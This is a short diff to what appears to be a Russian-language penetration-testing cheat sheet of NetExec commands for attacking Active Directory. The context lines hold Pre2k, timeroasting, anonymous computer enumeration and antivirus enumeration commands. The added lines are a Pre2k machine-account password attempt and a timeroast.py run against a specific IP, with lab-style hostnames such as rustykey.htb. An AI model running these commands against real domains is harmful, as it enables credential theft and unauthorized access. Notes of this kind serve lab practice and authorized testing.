@@ -121,9 +121,13 @@
 
 		(атака Pre2k)	nxc ldap dc_control.do.com -u 'comp' -k --use-kcache -M pre2k		
 
+						nxc ldap dc_control.do.com -u 'COMP$' -p comp --no-bruteforce
+				
 		(посмотреть все компы в сети) nxc smb <dc> -u '' -p '' --computers
 
 		(атака timeroasting)	nxc smb rustykey.htb -M timeroast
+
+								python3 timeroast.py -o dc2 -t 60 10.28.16.16 
 
 		(поиск антивирусов)	nxc smb dc1.corp.com -u 'administrator' -p 'password' -M enum_av		
 
